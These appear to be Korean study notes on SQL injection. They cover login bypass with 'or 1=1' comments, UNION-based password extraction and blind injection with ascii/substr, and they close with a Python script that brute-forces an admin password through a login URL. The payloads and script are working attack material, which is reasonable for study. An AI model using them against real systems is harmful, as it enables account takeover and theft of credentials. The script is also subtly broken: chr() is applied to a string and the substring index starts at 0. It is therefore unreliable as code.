# **SQL Injection**

<br>

* ### SQL Injection은 클라이언트의 입력값을 조작하여 서버의 데이터베이스를 공격할 수 있는 공격방식이다.
* ### 공격자는 입력값을 조작하여 임의의 SQL문을 주입하여, 원하는 기밀정보를 탈취하거나, DB내용 변경, 데이터 삭제 등 치명적인 행동을 할 수 있다.

- - -

<br>

* ## **공격 기법**

<br>

* ### 아래는 애플리케이션이 DBMS에 보내는 query다.

<br>

```sql
SELECT * FROM accounts
WHERE user_id = 'user_id' and
user_pw = 'password'
```
<br>

* ### user_id에 사용자가 입력한 id, pasword에 사용자가 입력한 pw가 들어가는데, query를 조작 시 아래와 같이 만들 수 있다.

<br>

```sql
SELECT * FROM accounts WHERE
user_id = 'admin'
```

* ### 이렇게 될 시, password는 비교하지 않고, 값이 반환되기 때문에 admin 계정으로 로그인할 수 있다.

<br>

* ### uid에 guest, admin이 있고 upw에는 guest의 password guest와 admin의 password가 있다있다고 할 때 admin으로 로그인하려면, 아래와 같이 하면 된다.

<br>

```sql
SELECT * FROM user_table
WHERE uid='admin' or 1 = 1 --and upw = '';
```

* ### uid값을 admin' or 1 = 1 #을 입력할 시 id의 범위인 ''를 끝내고, or 1 = 1을 함으로써 결과가 무조건 True가 된다.
* ### 그리고, 주석으로 뒷 query를 무시할 시, 조건문을 무시하고 모든 결과가 출력된다.
<br>

* ### admin의 upw를 알아내려면, 아래와 같이 입력하면 된다.

<br>

```sql
SELECT * FROM user_table
WHERE uid= 'admin' union select upw from user_table where uid = "admin" -- and upw = '';
```

* ### 아래와 같이 입력 시, 검색 후 union select로 또 다른 조회를 하는데, 여기서 user_table의 admin의 password를 검색한다.

- - -

<br>

## **Blind SQL Injection**

<br>

* ### Blind SQL Injection은  스무고개 게임과 유사한 방식으로 데이터를 알아낼 수 있다.
* ### 아래는 계정 정보를 탈취한다고 가정했을 때의 예시이다.

<br>

### 1. dreamhack 계정의 비밀번호 첫 글자는 'x'인가요?
+ 아닙니다.
  <br>
### 2. dreamhack 계정의 비밀번호 첫 번째 글자는 'p' 인가요?
+ 맞습니다.

<br>

* ### 이런 식으로, 답변이 True 혹은 False로 이루어져 있을 때, 참/거짓 결과로 데이터를 획득하는 공격 기법을 Blinde SQL Injection이라고 한다.

<br>

* ### blind sql injection 공격을 할 때엔 ascii 함수와 substr함수를 자주 사용한다.
<br>

```sql
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
```

* ### 이런 쿼리는, 답이 0이나 1로 나올 경우 False이므로 첫 글자는 r이 아니란 게 된다. 만약 True일 경우, 첫 글자가 r인 것이다.

<br><br>

### Blind sql Injection 공격 스크립트

<br>

```py
#!/usr/bin/python3
import requests
import string
url = 'http://example.com/login' # example URL
params = {
    'uid': '',
    'upw': ''
}
tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
for idx in range(0, 20):
    for ch in tc:
        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break
print(f"Password is {password}")
```

<br>

* ### 해당 코드는 비밀번호에 들어갈 수 있는 값인 숫자,문자,특수문자를 각 자릿수에 한 번씩 보내서 결괏값이 True인 경우(Login success) 최종 비밀번호에 해당 값을 추가한다.